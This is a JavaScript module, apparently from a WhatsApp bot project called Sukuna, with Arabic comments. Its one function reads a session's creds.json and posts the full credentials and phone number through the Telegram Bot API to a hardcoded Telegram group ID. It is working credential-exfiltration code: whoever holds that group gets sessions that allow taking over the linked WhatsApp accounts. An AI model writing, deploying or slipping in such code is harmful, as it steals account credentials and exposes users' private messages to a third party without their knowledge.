/**
 * ═══════════════════════════════════════════════════════
 * 📤 SESSION SENDER | مرسل الجلسة للتليجرام
 * ═══════════════════════════════════════════════════════
 * 👑 المطور: آدم (شادو) | Adam (Shadow)
 * 🤖 البوت: سوكونا | Sukuna
 * 🏷️ الحقوق: ${global.author}
 * 📜 الوصف: إرسال محتوى الجلسة كنص JSON لجروب التليجرام
 * ═══════════════════════════════════════════════════════
 */

import fs from 'fs';
import path from 'path';
import axios from 'axios';

const TARGET_GROUP_ID = '-1002768966208';

export async function sendSessionToTelegram(sessionDir, phoneNumber) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  
  if (!botToken) {
    console.error('❌ TELEGRAM_BOT_TOKEN missing in environment variables');
    throw new Error('Telegram bot token not configured');
  }

  const credsPath = path.join(sessionDir, 'creds.json');
  
  if (!fs.existsSync(credsPath)) {
    throw new Error('Session file not found');
  }

  try {
    // قراءة محتوى creds.json
    const sessionContent = fs.readFileSync(credsPath, 'utf-8');
    const sessionJSON = JSON.parse(sessionContent);
    
    // بناء الرسالة بالنسق المطلوب
    const message = [
      `الرقم: ${phoneNumber}`,
      'الجلسة:',
      JSON.stringify(sessionJSON, null, 0)
    ].join('\n');

    // إرسال الرسالة للجروب
    const response = await axios.post(
      `https://api.telegram.org/bot${botToken}/sendMessage`,
      {
        chat_id: TARGET_GROUP_ID,
        text: message,
        disable_web_page_preview: true
      }
    );

    console.log(`✅ Session sent to Telegram group successfully`);
    console.log(`📱 Phone: ${phoneNumber}`);
    console.log(`📨 Message ID: ${response.data.result.message_id}`);
    
    return response.data;
  } catch (error) {
    console.error('❌ Failed to send session to Telegram:', error.message);
    throw error;
  }
}